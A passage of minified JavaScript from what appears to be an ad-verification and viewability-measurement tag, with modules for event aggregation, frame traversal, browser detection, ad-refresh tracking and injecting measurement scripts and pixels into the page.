e.VIDEO_BLOCK_RESULT = "videoBlockResult", e.VIDEO_QUARTILE_EVENT = "videoQuartileEvent";
  }(F || (F = {})), function (e) {
    e.BEFORE_UNLOAD = "beforeunload";
  }(U || (U = {})), function (e) {
    e.AD_NODE = "adNode", e.AD_PROXY = "adProxy", e.AD_RENDER_STATUS = "adRenderStatus", e.AD_SLOT_IDS = "adSlotIds", e.AD_TALK_EVENT_AGGREGATOR = "adTalkEventAggregator", e.AD_TALK_MESSAGE = "adTalkMessage", e.AD_TALK_MESSAGE_COLLECTION = "adTalkMessageCollection", e.BROWSER = "browser", e.COMMUNICATION = "mComm", e.CONTEXT = "context", e.ERRORS = "mErrors", e.FEATURES = "features", e.FRAME_COLLECTION = "frameCollection", e.ID_MAP_MODULE = "idMapModule", e.IDS = "ids", e.IFRAME_CALCULATOR_HELPER = "iframeCalculatorHelper", e.INTER_FRAME_QUERY_SELECTOR = "interFrameQuerySelector", e.JOB_FACTORY = "jobFactory", e.JSONP = "mJsonp", e.MOBILE_APP = "mobileApp", e.OMID_AD_SESSION_CONTEXT = "omidAdSessionContext", e.OMID_AS_VERIFICATION_PARAMS = "omidAdSessionVerificationParameters", e.OMID_VERIFICATION_CLIENT = "omidVerificationClient", e.PAGE = "mPage", e.PAGE_URLS = "pageUrls", e.SCREEN_EVENTS = "mScreenEvents", e.USE_YIELD_SEARCH = "useYieldSearch", e.VIDEO = "video", e.VIDEO_VERSION = "videoVersion", e.VIEWABILITY = "viewability", e.VIEWABILITY_DEFINITIONS = "viewabilityDefinitions";
  }(x || (x = {})), function (e) {
    e.AD_HEIGHT = "adHeight", e.AD_WIDTH = "adWidth", e.APP_SDKS_DETECTED = "sdk", e.B11 = "b11", e.BAD_URL_NO_PERIOD = "bunp", e.BAPI_CLIENT = "bapiClient", e.BOOTSTRAPPER_APP = "app", e.BOOTSTRAPPER_MOB_APP_WEBVIEW = "maw", e.BOOTSTRAPPER_MOB_OR_TAB = "mot", e.BROWSER_IS = "browserIs", e.CNOD = "cnod", e.CONTEXT_NODE = "contextNode", e.CUSTOM_METRIC_IN_VIEW_REASON = "cmr", e.GEOMETRY_EVENTS_RECEIVED = "og", e.INITIAL = "initial", e.LENGTH = "length", e.MAIN_FUNCTION_STARTED_NOW = "mtim", e.MAPP1_EXCLUSION_LIST_MATCH = "xlu", e.MATCHED_MOBILE_APP_DETECTION_RULE = "drul", e.MEASURABLE_FOR_RENDER = "rmeas", e.METRIC_ID = "metricId", e.METRIC_ID_EVENT_CALL = "scm", e.METRIC_ID_LIST = "metricIdList", e.MISMATCH_OF_INTEGRATED_BLOCKING_TAG_TYPES = "smm", e.MOB_APP_WEBVIEW = "mobAppWebview", e.MOB_OR_TAB = "mobOrTab", e.MOB_APP = "app", e.MOBILE_APP_ENVIRONMENT = "mapp", e.MOBILE_FW_URL = "mobFwUrl", e.MRAID_INJECTION_STATUS = "mi", e.OMID_APP_MEASUREMENT = "oam", e.OMID_RENDERED_INDICATION = "oren", e.OMID_SESSION_ERROR = "oser", e.OMID_SESSION_FINISH = "osef", e.ORIGINAL_MOB_OR_TAB = "origMobOrTab", e.PERFORMANCE = "prf", e.PLUGIN_DECODED = "pd", e.PLUGIN_LIST = "pl", e.SAFEFRAME = "sf", e.SAFEFRAME_HOSTURL = "sfhu", e.SAFEFRAME_INVALID_HOSTURL = "sfiv", e.SLID = "slid", e.STATIC_CONFIG_REQUEST_TIME = "scq", e.STATIC_CONFIG_RESPONSE_TIME = "scs", e.STATIC_IMPRESSION_RFW_CALL_REQUEST_TIME = "siq", e.STATIC_IMPRESSION_RFW_CALL_RESPONSE_TIME = "sis", e.THIRD_PARTY_DATA_LOOKUP = "tpiLookup", e.VIDEO_BREAK_POSITION = "vbp", e.VIDEO_CHANNEL = "vc", e.VIDEO_PLAYER_STATE = "vps";
  }(W || (W = {}));
  const q = function () {
    "use strict";

    const e = {},
      t = {},
      n = function (e, n) {
        t[e] = t[e] || [], t[e].push(n);
      },
      r = function (t, n) {
        const r = e[t];
        r && r.run.apply({}, n);
      },
      i = function (e, n, r) {
        let i = t[e];
        if (i && 0 !== i) return r && (i = i.slice(0, 1)), I(i).each(function (e, t) {
          n.apply({}, t);
        }), !0;
      },
      o = function (t, n, r) {
        e[t] = e[t] || new X(), e[t].push(n, r);
      };
    return {
      on: function (e, t) {
        let n = {};
        t ? n[e] = t : n = e, I(n).each(o), I(n).each(i);
      },
      once: function (e, t) {
        i(e, t, !0) || o(e, t, 1);
      },
      trigger: function (e) {
        const t = I(arguments).toArray();
        t.shift(), r(e, t);
      },
      persistentTrigger: function (e) {
        const t = I(arguments).toArray();
        t.shift(), n(e, t), r(e, t);
      }
    };
  };
  var K = function () {
    "use strict";

    var e = function (t, n, r) {
        var i,
          o,
          a = n.length,
          s = Oe.isWindow(t) ? t.frames : Oe.getChildWindowsOf(t);
        if (r && r(t, n), s && s.length) {
          for (i = 0; i < s.length; i++) (o = s[i]) && Oe.isWindow(o) && (n[a] = i, e(o, n, r));
          n.pop();
        }
      },
      t = function (t, n) {
        try {
          e(n || top, [0], t);
        } catch (e) {}
      };
    return {
      traverse: t,
      getFrames: function (e, n) {
        var r = [];
        return t(function (e) {
          Oe.isWindow(e) && function (e, t) {
            var n,
              r = !0;
            for (n = 0; n < e.length; n++) if (e[n] === t) {
              r = !1;
              break;
            }
            return r;
          }(r, e) && r.push(e);
        }, n), I(r).filter(e);
      }
    };
  };
  const X = function () {
    "use strict";

    const e = [];
    return {
      push: function (t, n) {
        let r = 0;
        n = n || Number.MAX_VALUE;
        e[e.length] = function () {
          r < n && (r++, t.apply({}, arguments));
        };
      },
      run: function () {
        const t = arguments;
        I(e).each(function (e, n) {
          n.apply({}, t);
        });
      }
    };
  };
  var z = function (e) {
      "use strict";

      var t = {};
      return {
        doEligibleJobs: function (n) {
          I(e).each(function (e, r) {
            var i = r && r.getTime();
            I.isDef(i) && n >= i && !t[i] && (r.getTask().call(), t[i] = !0);
          });
        }
      };
    },
    J = function () {
      "use strict";

      var e,
        n = new Q();
      return {
        listen: function (r, i, o) {
          e = function (e) {
            !function (e, t, r, i) {
              var o, a, s, c;
              if (JSON && JSON.parse) try {
                o = JSON.parse(e.data), a = e.source, c = I.noop, t(o) && (i && (s = i(a, o)) && (c = function () {
                  n.send(function () {
                    return s;
                  }, a);
                }), r(e, o, c));
              } catch (e) {
                o && T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.MESSAGE_LISTENER);
              }
            }(e, r, i, o);
          }, _e.addEvent(t, "message", e);
        },
        stop: function () {
          e && _e.removeEvent(t, "message", e), e = null;
        }
      };
    },
    Q = function () {
      "use strict";

      return {
        send: function (e, t) {
          if (JSON && JSON.stringify) {
            var n = function (e) {
              return I(e).isObj() ? [e] : new K().getFrames(e);
            }(t);
            I(n).each(function (t, n) {
              var r,
                i = I.resolve(e, n) || {};
              i.sentTime = We.now(), r = function (e) {
                return I(e).mapToObj(function (e, t) {
                  var n;
                  return I.isFunction(t) || ((n = {})[e] = t), n;
                });
              }(i), n.postMessage(I(r).JSONStringify(), "*");
            });
          }
        }
      };
    },
    $ = function (e) {
      "use strict";

      var t = 0,
        n = {},
        r = function (e, n, r) {
          if (I.isUndef(e.output)) throw new Error("item with id " + n + ' must have "output" method');
          this.item = e, this.id = n || ++t, this.props = r || {}, this.output = function () {
            var t = I.resolve(e.output);
            return this.props.asION && (t = I(t).toION()), t;
          };
        },
        i = function (e) {
          var t,
            r,
            i = [];
          for (t in n) n.hasOwnProperty(t) && (r = e(t, n[t])) && i.push(r);
          return i;
        },
        o = function (e, t, i) {
          i = "string" != typeof (i = i || t) ? i : {};
          var o = I(e.output).isObj() && !i.asION,
            a = function (e, t, i) {
              var o = new r(e, t, i);
              n[o.id] = o;
            };
          o ? I(e.output).each(function (e, t) {
            a({
              output: t
            }, e, i);
          }) : a(e, t, i);
        };
      return e.on(F.ADD_OUTPUT_ITEM, function (e, t, n) {
        o(e, t, n);
      }), {
        addItem: o,
        filterOutput: function (e, t) {
          return i(function (n, r) {
            var i,
              o = r.props;
            e(o) && (i = r.output(), o.encode && (n = encodeURIComponent(n), i = encodeURIComponent(i)), I.isFunction(t) ? t(n, i) : t[n] = i);
          });
        },
        iterate: i,
        cleanup: function () {
          i(function (e, t) {
            t.props.flagForRemoval && delete n[e];
          });
        },
        getItem: function (e) {
          return n[e];
        }
      };
    };
  const Z = function () {
    "use strict";

    const e = {},
      t = (t, n) => {
        e[t] = n;
      };
    return {
      request: function (t) {
        let n;
        const r = e[t],
          i = I(arguments).toArray();
        return i.shift(), I.isUndef(r) || (n = I.isFunction(r) ? r.apply({}, i) : r), n;
      },
      provide: (e, n) => (n ? t(e, n) : I(e).each(t), n)
    };
  };
  var ee = function () {
      "use strict";

      return {
        createInstance: function (e, t, n, r) {
          return Ae.isDomless() ? new ne() : new te(e, t, n, r);
        }
      };
    },
    te = function (e, t, n, r) {
      "use strict";

      var i,
        o = function (e, t) {
          return {
            viewState: A.NA,
            posViewState: A.NA,
            embedded: Ae.embedded,
            winDimensions: e,
            adDimensions: t
          };
        };
      return {
        collect: function () {
          var t = e.find(),
            a = t.getOutOfViewReasons(),
            s = n.isHidden(),
            c = r.isDeviceTypeGroupMobile() && i ? i : Se(Oe.calcWinDims()),
            u = t.getDims();
          return i = c, t.hasAd() && c.hasValidDims() && u.hasValidDims() ? (!0 === s && a.push(A.OUT_OF_VIEW_REASONS.FOCUS), {
            winDimensions: c,
            adDimensions: u,
            containerDimensions: t.getContainerDims(),
            method: t.getDetectionMethod(),
            viewState: a.length ? A.OUT_OF_VIEW : t.getViewState(),
            viewStateIgnoringRender: t.getViewStateIgnoringRender(),
            percentInView: t.getPercentInView(),
            percentInViewIgnoringRender: t.getPercentInViewIgnoringRender(),
            reason: a.join("."),
            obstructed: I.stringifyTriState(t.isObstructed()),
            isHidden: I.stringifyTriState(t.isHidden()),
            tabHidden: I.stringifyTriState(s),
            posViewState: t.getViewState(),
            adCompCount: t.getComponentCount(),
            sliceStatus: t.getSliceStatus()
          }) : o(c, u);
        }
      };
    },
    ne = function () {
      "use strict";

      return {
        collect: function () {
          return {};
        }
      };
    },
    re = function (e) {
      "use strict";

      e = e || I.identity;
      var t = [],
        n = We.now(),
        r = function () {
          var e = We.now();
          t.length && (t[t.length - 1].duration += e - n, n = e);
        };
      return {
        clear: function () {
          r(), t = [];
        },
        fastForward: r,
        get: function () {
          return t;
        },
        hasAlwaysBeen: function (e) {
          return 1 === t.length && t[0].state === e;
        },
        addState: function (n) {
          var i = t[t.length - 1],
            o = e(n);
          r(), 0 !== t.length && o === i.state || t.push({
            state: o,
            duration: 0
          });
        }
      };
    };
  const ie = function (e, t) {
    "use strict";

    const n = e || 1;
    let r,
      i = 0,
      o = 0,
      a = 0;
    return {
      start: () => {
        i % n == 0 && (r = We.now());
      },
      stop: () => {
        const e = r || t;
        i % n == 0 && (a += We.now() - e, o++), i++;
      },
      getTime: () => a,
      getCount: () => o
    };
  };
  var oe = function () {
      "use strict";

      var e,
        t = 0,
        n = 0,
        r = new q(!0),
        i = function () {
          e && (t++, r.trigger(t), n > t ? We.execAtEndOfThread(i) : o());
        },
        o = function () {
          e = !1, t = 0;
        };
      return {
        onTick: function (e, t) {
          var i = I.collapseArgsIntoHash(e, t);
          I(i).each(function (e, t) {
            e = parseInt(e), n = e > n ? e : n;
          }), r.on(i);
        },
        start: function () {
          e || (e = !0, We.execAtEndOfThread(i));
        },
        kill: o,
        isActive: function () {
          return e;
        }
      };
    },
    ae = function (e) {
      "use strict";

      var t,
        n = 0,
        r = Ae.getTagTime(),
        i = 0,
        o = !1;
      return {
        getTotalTime: function () {
          return i;
        },
        stop: function () {
          n = 0, r = Ae.getTagTime(), o = !1;
        },
        mark: function () {
          t = o ? Ae.getTagTime() - r : 0, (n += t) >= e && (i += n - t < e ? n : t), r = Ae.getTagTime(), o = !0;
        }
      };
    };
  const se = function (t, n) {
    "use strict";

    let r = t || e.adsafeSrc || e.requrl;
    r && 0 === r.indexOf("http") || (r = 0 === r.indexOf("//") ? e.protocol + ":" + r : e.protocol + "://" + r);
    const i = /((http|https):\/\/(([^\/\.]*)\.([^\/]*)))(?:\/(.[^?]*)\??(.+)?)*/.exec(r) || [],
      o = i[1] ? i[1] : "",
      a = i[2] ? i[2] : "",
      s = i[3] ? i[3] : "";
    let c = i[4] ? i[4] : "",
      u = i[5] ? i[5] : "",
      d = t && i[6] ? i[6] : "",
      g = i[7] && n ? i[7] : "";
    const f = {},
      l = function (e) {
        return "string" == typeof e && (c = e), c;
      },
      E = function (e) {
        return "string" == typeof e && (u = e), u;
      },
      p = function (t, n) {
        const r = t + "=" + I(n).toION();
        return I.encodeInvalidUrlChars(r, e.encodeInvalidUrlChars);
      },
      m = function () {
        const e = I(f).isEmpty() ? "" : I(f).stringify(p, "&");
        return "?" + g + (g && e ? "&" + e : e);
      };
    g = g ? g.replace(/&$/, "") : "";
    return {
      appendToParamValue: function (e, t) {
        let r, i, o, a;
        const s = f[e];
        s ? f[e] = s + t : n && g.length && (r = g.split(e), a = r.length > 1, a && (i = r[1].split("&")[0], o = [r[0], i].join(e), g = g.replace(o, o + t)));
      },
      fullDom: o,
      hostname: s,
      sub: l,
      master: E,
      setParam: function (e, t) {
        f[e] = f[e] || {}, "string" == typeof t || "number" == typeof t ? f[e] = t : I(f[e]).mixin(t);
      },
      path: function (e) {
        d = e;
      },
      toString: function () {
        const e = l() ? l() + "." : "",
          t = d ? "/" + d : "",
          n = g || !I(f).isEmpty() ? m() : "";
        return a + "://" + e + E() + t + n;
      }
    };
  };
  var ce = function () {
      "use strict";

      var e = function (e) {
          var t = [];
          return I(e).each(function (e, n) {
            t.concat(n).join("").length <= 400 && t.push(n);
          }), t;
        },
        t = function (e) {
          var t = Oe.getAncestorNodes(e);
          return I(t).map(n);
        },
        n = function (e, t) {
          var n;
          return t && t.id && (n = t.id.replace(/[^\w-_.>\/]/g, "")), n;
        };
      return function () {
        var n, r;
        try {
          return Ae.friendly && !Ae.isMobileApp() && ((n = T.getAggregator().request("adSlotIds")) ? r = n : (n = function () {
            var n, r;
            return (n = Oe.getOurNodeInTop()) && (r = t(n)), r && e(r);
          }(), n && (T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: n
          }, W.SLID, {
            type: A.DT_CODES.ADTALK,
            asION: !0
          }), T.getAggregator().provide("adSlotIds", n), r = n))), r;
        } catch (e) {
          T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.AD_SLOT_ID);
        }
      }();
    },
    ue = {
      name: "AdRefreshDetection",
      dependencies: [],
      creator: function () {
        "use strict";

        var t = [15, 30, 45, 60, 90],
          n = {
            start: function () {
              var t = this,
                n = e.asid,
                r = this.getChanId(),
                i = e && e.contextNode && e.contextNode.nextSibling && e.contextNode.nextSibling.id;
              n && r && (this.recordAdSlotImpression(n, r, i, function (e, n) {
                e ? T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.AD_REFRESH) : t.sendRefreshSession(n);
              }), t.registerInternalViewabilityListener(r, i));
            },
            adRefreshIntervalIsValid: function (e) {
              return -1 !== t.indexOf(e);
            },
            getChanId: function () {
              for (var t, n = e.reqquery.split("&"), r = /(\S+)=(\S+)/g, i = 0; i < n.length; i += 1) {
                r.lastIndex = 0;
                var o = r.exec(n[i]);
                o && 3 === o.length && "chanId" === o[1] && (t = o[2]);
              }
              return t;
            },
            sendRefreshSession: function (e) {
              var t = (0 === e.refreshCount ? "self" : e.refreshSessionId) + "." + e.refreshCount;
              T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.ENVIRONMENT, "ar", t);
            },
            recordAdSlotImpression: function (e, t, n, r) {
              var i = We.getTop(),
                o = {
                  requestTop: "recordAdSlotImpression",
                  asid: e,
                  adUnitId: t,
                  cacheId: n
                };
              window.addEventListener("message", function (e) {
                if (/refreshSession/g.test(e.data)) try {
                  var t = e && e.data && JSON.parse(e.data);
                  r(null, t);
                } catch (e) {
                  r(e);
                }
              }, !1), i.postMessage(JSON.stringify(o), "*");
            },
            registerInternalViewabilityListener: function (e, t) {
              var n = this,
                r = g.measurementConfig.adRefreshThreshold && parseInt(g.measurementConfig.adRefreshThreshold) || null,
                i = We.getTop();
              r && this.adRefreshIntervalIsValid(r) && T.getAggregator().on(F.SEND_DT, function (o, a) {
                o === A.DT_CODES.PING && a === r && (We.execAtEndOfThread(function () {
                  i.postMessage(JSON.stringify({
                    requestTop: "refreshAd",
                    adUnitId: e,
                    cacheId: t
                  }), "*");
                }), n.sendAutoRefreshProp(r));
              });
            },
            sendAutoRefreshProp: function (e) {
              T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.ENVIRONMENT, "ir", e), T.getAggregator().trigger(F.AD_SESSION_COMPLETE);
            }
          };
        return Ae.isRefreshable(function (e, t) {
          var r;
          if (!e && t) try {
            (r = JSON.parse(t)).isRefreshable && r.adServerName && n.start();
          } catch (e) {
            T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.AD_REFRESH);
          }
        }), n;
      },
      settings: {
        tier: A.TIERS.ENVIRONMENT,
        applies: function (e, t, n) {
          "use strict";

          return n.isPossiblyRefreshable();
        }
      }
    },
    de = function () {
      "use strict";

      var e,
        t,
        n = function (e, t) {
          return -1 !== t.indexOf("https") && (t += "*"), t.replace(/^https?:\/\//, "");
        },
        r = function () {
          if (T.getAggregator().request(x.AD_NODE)) return parseFloat(T.getAggregator().request(x.VIDEO_VERSION));
        };
      return {
        isApplicable: function (e, t, n) {
          return !function (e) {
            return e.isVideo() && !(e.isMraid() || e.isOmid()) && r() < 3.7;
          }(n) && e.hasAncestorOrigins && e.hasAncestorOrigins() && t.on("ancestor") && n.xDomainIframe;
        },
        isStarted: function () {
          return !!t;
        },
        start: function () {
          try {
            e = We.getWindow().location.ancestorOrigins, t = !0;
          } catch (e) {
            T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.ANCESTOR_ORIGINS);
          }
        },
        getMyFrameDepth: function () {
          return e && e.length || 0;
        },
        getTopDomain: function () {
          return I.last(e);
        },
        sendOriginList: function () {
          var t;
          t = "ao:" + (e ? I(e).map(n).reverse() : []).join(","), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: t
          }, W.THIRD_PARTY_DATA_LOOKUP, {
            type: A.DT_CODES.THIRD_PARTY,
            standalone: !0,
            encode: !0
          }), T.getAggregator().trigger(F.SEND_DT, A.DT_CODES.THIRD_PARTY);
        }
      };
    },
    ge = function (t, n, r, i, o) {
      "use strict";

      var a = function (e, t, n) {
          o.addItem({
            output: e + "." + t + "." + n
          }, "ctpl");
        },
        s = function (e) {
          try {
            n.diagnostic("c");
            var o = e.length,
              s = 0,
              c = 0;
            a(o, 0, 0), I(e).each(function (e, n) {
              t.send(function (e) {
                return e.replace("%%CBS%%", i.getCacheBustId());
              }(n), function () {
                a(o, s, ++c);
              }, !0), a(o, ++s, c);
            });
          } catch (e) {
            r.add(A.ERROR_CODES.AT_SEND);
          }
        };
      return {
        init: function () {
          try {
            var n = new se().fullDom;
            "/" !== n.slice(-1) && (n += "/"), n += "tpl?asId=" + e.asid, t.jsonp(n, s);
          } catch (e) {
            r.add(A.ERROR_CODES.AT_INIT);
          }
        }
      };
    },
    fe = function (t, n, r, i) {
      "use strict";

      return {
        enabled: "true" === e.useBapiCallback,
        callback: function (n) {
          r.trigger(F.SEND_DIAG);
          try {
            "true" === e.accountForSadImps && i.measure(n), e._onAPIResult && e._onAPIResult(n);
          } catch (e) {
            t.add(A.ERROR_CODES.BAPI_CALLBACK), r.trigger(F.SEND_DIAG, "bapiClient");
          }
        }
      };
    },
    le = function () {
      "use strict";

      return {
        createInstance: function (e, t, n, r) {
          return Ae.isDomless() ? new pe() : new Ee();
        }
      };
    },
    Ee = function () {
      "use strict";

      var e = A.BROWSERS,
        t = function () {
          var t = "u",
            n = We.getWindow();
          try {
            I.isDef(n.opr) && n.opr.addons || I.isDef(n.opera) && I.isDef(n.opera.buildNumber) ? t = e.OPERA : I.isDef(n.mozInnerScreenY) ? t = e.GECKO : I.isDef(n.chrome) && I.isDef(n.chrome.csi) ? t = e.CHROME : I.isDef(n.msWriteProfilerMark) && I.isDef(n.crypto) ? t = e.MSEDGE : I.isDef(n.WebKitPoint) ? t = e.WEBKIT : (I.isDef(n.attachEvent) || I.isDef(n.msCrypto)) && (t = e.IE);
          } catch (e) {}
          return t;
        },
        n = function () {
          var t = We.getWindow(),
            n = I.isDef(t.navigator) && t.navigator.userAgent ? t.navigator.userAgent.toLowerCase() : "";
          return n.indexOf(" opr/") > -1 ? e.OPERA : n.indexOf("firefox") > -1 ? e.GECKO : n.indexOf("edg") > -1 ? e.MSEDGE : n.indexOf("chrome") > -1 ? e.CHROME : n.indexOf("webkit") > -1 ? e.WEBKIT : n.indexOf("msie") > -1 ? e.IE : encodeURIComponent(n) || "_";
        },
        r = function () {
          var e = !1,
            t = We.getWindow();
          return I.isDef(t.navigator) && I.isDef(t.navigator.userAgent) && (e = t.navigator.userAgent), e;
        };
      return {
        browserIs: function (e) {
          return t() === e;
        },
        hasIntersectionObserver: function () {
          return "function" == typeof IntersectionObserver;
        },
        hasMutationObserver: function () {
          return "function" == typeof MutationObserver;
        },
        hasResizeObserver: function () {
          return "function" == typeof ResizeObserver;
        },
        hasAncestorOrigins: function () {
          var e = We.getWindow().location;
          return !(!e || !e.ancestorOrigins);
        },
        hasPostMessage: function () {
          var e = We.getWindow();
          return !(!e || !I.isFunction(e.postMessage));
        },
        getBrowserType: t,
        getBrowserTypeByUA: n,
        getUserAgent: r,
        params: function () {
          return {
            br: t(),
            bru: n(),
            an: (e = A.NA, r = We.getWindow(), I.isDef(r.navigator) && I.isDef(r.navigator.appName) && (e = r.navigator.appName.toLowerCase()[0]), e)
          };
          var e, r;
        },
        isAndroidWebViewBrowser: function () {
          var e = r();
          return Xe.contains(e, "Android") && I(["Line", "SamsungBrowser", "FB_IAB", "Silk"]).findFirst(function (t, n) {
            return Xe.contains(e, n);
          });
        },
        getIOSVersion: function () {
          var e,
            t,
            n,
            i = r();
          return i && (e = i.match(/OS\s\d+/)) && e.length > 0 && (n = (t = e.toString().match(/\d+/)) && t.length > 0 && parseInt(t.toString())), n;
        }
      };
    },
    pe = function () {
      "use strict";

      var e = function () {
        return !1;
      };
      return {
        getBrowserType: () => "u",
        getBrowserTypeByUA: () => "d",
        getIOSVersion: () => {},
        params: () => ({
          br: "u",
          bru: "d",
          an: A.NA
        }),
        browserIs: e,
        getUserAgent: e,
        hasPostMessage: e,
        hasAncestorOrigins: e,
        hasIntersectionObserver: e,
        hasMutationObserver: e,
        isAndroidWebViewBrowser: e
      };
    },
    me = function () {
      "use strict";

      return {
        createInstance: function (e, t) {
          return Ae.isDomless() ? new Te(t) : new he(e, t);
        }
      };
    },
    Ie = function () {
      "use strict";

      var t;
      return {
        isApplicable: function (n) {
          var r = !(!(t = T.getAggregator().request("omidAdSessionContext")).app || !t.isDisplay || t.isWeb),
            i = n && n.indexOf("/blocking/") > -1 && !Ae.integratedBlockingApplies(n),
            o = 1 != e.forceNoIframe;
          return r && i && o;
        },
        deployBlockingScriptIntoIframe: function (n) {
          t = T.getAggregator().request("omidAdSessionContext");
          var r,
            i = "iasbi" + e.asid,
            o = function (t, n) {
              var r,
                i,
                o,
                a = e[W.CONTEXT_NODE].parentNode,
                s = "about:blank",
                c = e.adWidth && e.adWidth > 0 ? e.adWidth : 0,
                u = e[W.AD_HEIGHT] && e[W.AD_HEIGHT] > 0 ? e[W.AD_HEIGHT] : 0,
                d = We.getDoc().getElementsByTagName("ins"),
                g = 0,
                f = 0;
              d && d.length > 0 && (o = d[0], g = parseInt(o.style.width), f = parseInt(o.style.height));
              var l = g || c || window.innerWidth,
                E = f || u || window.innerHeight;
              return "complete" === We.getDoc().readyState && (e.forceAppend = "true"), "true" === e.forceAppend ? ((r = We.getDoc().createElement("IFRAME")).id = t, r.src = s, a.appendChild(r)) : We.getDoc().write('<iframe id="' + t + '" src="' + s + '"></iframe>'), (i = We.getDoc().getElementById(t)) && (i.style.width = l + "px", i.style.height = E + "px", i.scrolling = "no", i.frameborder = 0, i.style.position = "absolute", i.style.padding = i.style.margin = i.style.border = "0px"), i;
            }(i);
          o && (r = o.contentWindow.document) && (r.open().write(function (e, t) {
            var n,
              r = "",
              i = "",
              o = We.getDoc().getElementsByTagName("ins");
            if (o && o.length > 0) {
              n = o[0], r = "<ins";
              for (var a = 0; a < n.attributes.length; a++) r += " " + n.attributes[a].nodeName + '="' + n.attributes[a].nodeValue + '"';
              r += ">", i = "</ins>";
            }
            return '<!doctype html><html><head></head><body style="margin:0px;border:0px;padding:0px;font-size:0px"><script>var IASid = "' + e + '", largestSize = 0;var IASmonitorDom = function () {  var DOM_MONITOR_PERIOD = 100;  var i, us, thisSize, thisWidth, thisHeight;  var elems = document.body.getElementsByTagName("*");  for (i = 0; i < elems.length; i++) {    if (elems[i].tagName && elems[i].tagName.toLowerCase() === "ins")      continue;    thisWidth = elems[i].offsetWidth;    thisHeight = elems[i].offsetHeight;    thisSize = thisWidth * thisHeight;    if (thisSize > largestSize) {      largestSize = thisSize;      us = parent.document.getElementById(IASid);      if (us) {        us.setAttribute("CreativeLoaded","true");        if (elems[i].style.left !== "") {          us.style.left = elems[i].style.left;          elems[i].style.left = "0px";        }        if (elems[i].style.top !== "") {          us.style.top = elems[i].style.top;          elems[i].style.top = "0px";        }      }    }  }  setTimeout(IASmonitorDom, DOM_MONITOR_PERIOD);};setTimeout(IASmonitorDom,50);<\/script>' + r + '<script src="' + t + '" referrerpolicy="' + A.REFERRER_POLICY + '"><\/script>' + i + "</body></html>";
          }(i, n)), r.close());
        }
      };
    },
    he = function (r, i) {
      "use strict";

      var o = function (e, t) {
          return "//" + e + encodeURIComponent(t);
        },
        a = function (t) {
          var n = !1;
          return Ae.isMSFT() && (n = !(t && -1 != t.toString().indexOf("jsconfig.adsafeprotected.com/jsconfig")) && e.iasProxyPartnerDomain), n;
        },
        s = function (t, r, i, s) {
          var c,
            u,
            d = a(r);
          d && (r = o(d, r)), "script" !== t ? ((u = n.createElement("DIV")).innerHTML = i, c = u.childNodes[0]) : ((c = n.createElement("SCRIPT")).src = r, s && (c.onload = s)), e[W.CONTEXT_NODE].parentNode.appendChild(c);
        },
        c = function (r, i, c) {
          var u,
            d,
            g,
            f = "",
            l = function (e) {
              var t = a(e);
              return t && (e = o(t, e)), ' src="' + e + '"';
            }(i),
            E = ' referrerpolicy="' + A.REFERRER_POLICY + '"';
          Ae.doesPageAllowAppendedScripts() && c && (d = "__IntegralASEventLoadHandler_" + e.asid.replace(/-/g, ""), t[d] = c, f = function (e) {
            return ' onload="' + e + " && " + e + '()"';
          }(d)), g = {
            script: ['<script type="text/javascript"', f, l, E, "><\/script>"],
            iframe: ['<iframe width="100%" height="100%" frameborder="0" vspace="0" hspace="0" scrolling="no" marginheight="0" marginwidth="0"', f, l, E, "></iframe>"],
            img: ["<img", f, l, E, "/>"]
          }[r].join(""), Ae.isOmid() ? (u = new Ie()).isApplicable(i) ? u.deployBlockingScriptIntoIframe(i) : s(r, i, g, c) : ("loading" !== We.getDoc().readyState && (e.forceAppend = "true"), "true" === e.forceAppend ? s(r, i, g, c) : n.write(g));
        },
        u = function (e, t, n) {
          var r,
            i = !n && _e.getXHR2(),
            s = a(e);
          s && (e = o(s, e)), i ? (i.open("POST", e), i.onreadystatechange = function () {
            4 === i.readyState && 200 === i.status && t && t();
          }, i.send()) : (r = Oe.createImage(), t && (r.onload = t), r.src = e.toString());
        },
        d = function (e, t) {
          var n = _e.getXHR2(),
            r = a(e);
          r && (e = o(r, e)), n && (n.open("GET", e), n.onreadystatechange = function () {
            if (4 === n.readyState && 200 === n.status && t) try {
              var e = JSON.parse(n.responseText);
              t(e);
            } catch (e) {
              return;
            }
          }, n.send());
        },
        g = function (t, r, i, s) {
          var c = n.createElement("script");
          i = i || e[W.CONTEXT_NODE].parentNode;
          var u = a(t);
          u && (t = o(u, t)), c.type = "text/javascript", c.src = t, c.referrerPolicy = A.REFERRER_POLICY, r && (c.onload = r), s && (c.setAttribute("defer", ""), c.setAttribute("async", "")), I.isDef(i) && i.appendChild(c);
        },
        f = function (t) {
          if (I.isFunction(t)) t({
            iasImpId: e.asid
          });else if (t && "string" == typeof t) {
            var n = new se(t, !0).toString();
            u(n, void 0, !0);
          }
        },
        l = function (e, t, n, r) {
          g(i.wrap(e, t, n, r));
        };
      return T.getAggregator().on({
        addNode: c,
        send: u,
        exec: g,
        notify: f,
        getJSON: d,
        jsonp: l
      }), {
        addNode: c,
        send: u,
        exec: g,
        notify: f,
        getJSON: d,
        jsonp: l
      };
    },
    Te = function (t) {
      "use strict";

      var n = function (e, t) {
          t = t || e, e = arguments.length > 1 ? e : "script", t = encodeURI(t);
          var n = T.getAggregator().request("omidVerificationClient");
          n["script" === e ? "injectJavaScriptResource" : "sendUrl"](t, function () {});
        },
        r = function (e, t) {
          e = encodeURI(e), T.getAggregator().request("omidVerificationClient").sendUrl(e.toString(), t || function () {});
        },
        i = function (e, t) {
          var n = T.getAggregator().request("omidVerificationClient");
          e = encodeURI(e), n.injectJavaScriptResource(e, t || function () {});
        },
        o = function (t) {
          if (I.isFunction(t)) t({
            iasImpId: e.asid
          });else if (t && "string" == typeof t) {
            var n = new se(t, !0).toString();
            r(n);
          }
        },
        a = function (e, n, r, o) {
          i(t.wrap(e, n, r, o));
        };
      return T.getAggregator().on({
        addNode: n,
        send: r,
        exec: i,
        notify: o,
        jsonp: a
      }), {
        addNode: n,
        send: r,
        exec: i,
        notify: o,
        jsonp: a
      };
    },
    Ae = function (t) {
      "use strict";

